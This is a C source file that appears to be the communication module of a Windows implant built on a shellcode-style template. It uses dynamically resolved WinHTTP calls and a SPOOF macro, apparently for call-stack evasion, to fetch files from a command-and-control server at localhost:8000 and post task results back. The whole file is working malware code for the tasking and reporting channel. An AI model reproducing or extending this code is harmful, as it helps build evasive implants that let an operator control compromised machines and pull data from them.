#include <Communication.h>

FUNC BUFFER SendRequest(WCHAR *url, WCHAR *method, PPACKAGE Package)
{
    STARDUST_INSTANCE
    BUFFER response = {0};
    URL_COMPONENTS urlComp = {0};
    urlComp.dwStructSize = sizeof(urlComp);
    WCHAR hostname[256];
    WCHAR urlPath[256];
    urlComp.lpszHostName = hostname;
    urlComp.dwHostNameLength = ARRAYSIZE(hostname);
    urlComp.lpszUrlPath = urlPath;
    urlComp.dwUrlPathLength = ARRAYSIZE(urlPath);

    // Parse the URL.
    BOOL result = Instance()->Win32.WinHttpCrackUrl(url, 0, 0, &urlComp);
    if (!result)
    {
        return response; // Failed to crack the URL, return empty buffer
    }

    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPBYTE pBuffer = NULL;  // Pointer to the memory block
    DWORD dwBufferSize = 0; // Size of the buffer
    BOOL bResults = FALSE;

    // Initialize WinHTTP session.
    hSession = Instance()->Win32.WinHttpOpen(L"A WinHTTP Example Program/1.0",
                                             WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                             WINHTTP_NO_PROXY_NAME,
                                             WINHTTP_NO_PROXY_BYPASS, 0);

    // Specify an HTTP server.
    if (hSession)
        hConnect = Instance()->Win32.WinHttpConnect(hSession, urlComp.lpszHostName,
                                                    urlComp.nPort, 0);

    // Create an HTTP request handle.
    if (hConnect)
        hRequest = Instance()->Win32.WinHttpOpenRequest(hConnect, method, urlComp.lpszUrlPath,
                                                        NULL, WINHTTP_NO_REFERER,
                                                        WINHTTP_DEFAULT_ACCEPT_TYPES,
                                                        (urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0);

    // Send a request with the body if present.
    if (hRequest)
    {
        if (!Package)
        {
            bResults = Instance()->Win32.WinHttpSendRequest(hRequest,
                                                            WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                                            WINHTTP_NO_REQUEST_DATA, 0,
                                                            0, 0);
        }
        else
        {
            bResults = Instance()->Win32.WinHttpSendRequest(hRequest,
                                                            WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                                            Package->Buffer, Package->Length,
                                                            Package->Length, 0);
        }

        // End the request and receive the response.
        if (bResults)
            bResults = Instance()->Win32.WinHttpReceiveResponse(hRequest, NULL);

        if (bResults)
        {
            do
            {
                dwSize = 0;
                Instance()->Win32.WinHttpQueryDataAvailable(hRequest, &dwSize);

                // Allocate or reallocate buffer.
                if (dwSize > 0)
                {
                    LPBYTE pTemp = pBuffer ? Instance()->Win32.RtlReAllocateHeap(Instance()->Heap, HEAP_ZERO_MEMORY, pBuffer, dwBufferSize + dwSize)
                                           : Instance()->Win32.RtlAllocateHeap(Instance()->Heap, HEAP_ZERO_MEMORY, dwBufferSize + dwSize);
                    if (!pTemp)
                    {
                        // Handle allocation failure; possibly free existing memory and return
                        if (pBuffer)
                        {
                            Instance()->Win32.RtlFreeHeap(Instance()->Heap, 0, pBuffer);
                        }
                        goto LEAVE;
                    }
                    pBuffer = pTemp;

                    // Read the data into the buffer at the current position
                    if (Instance()->Win32.WinHttpReadData(hRequest, pBuffer + dwBufferSize, dwSize, &dwDownloaded))
                    {
                        dwBufferSize += dwDownloaded;
                    }
                }
            } while (dwSize > 0);

            // Update response to return
            response.Buffer = pBuffer;
            response.Length = dwBufferSize;
        }
    }

LEAVE:
    if (Package)
    {
        if (Package->Destroy)
        {
            PackageDestroy(Package);
        }
    }

    if (hRequest)
        SPOOF(Instance()->Win32.WinHttpCloseHandle, hRequest);
    if (hConnect)
        SPOOF(Instance()->Win32.WinHttpCloseHandle, hConnect);
    if (hSession)
        SPOOF(Instance()->Win32.WinHttpCloseHandle, hSession);

    return response;
}

FUNC BUFFER FileFetch(PCHAR FileId, PCHAR TaskID)
{
    PPACKAGE filePkg = PackageCreate(FileId);
    PackageAddString(filePkg, FileId);
    BUFFER File = SendRequest(L"http://localhost:8000/file", L"POST", filePkg);

    return File;
}

FUNC void Response(PCHAR Id, PVOID Data, BOOL Error, LPWSTR Endpoint)
{
    PPACKAGE pkg = PackageCreate(Id);
    PackageAddString(pkg, Id);
    if (!Data && Error)
        PackageAddString(pkg, "err");
    else if (Data)
        PackageAddString(pkg, Data);
    else
        PackageAddString(pkg, "Success");

    // Upload the concatenated data
    SendRequest(Endpoint, L"POST", pkg);
}
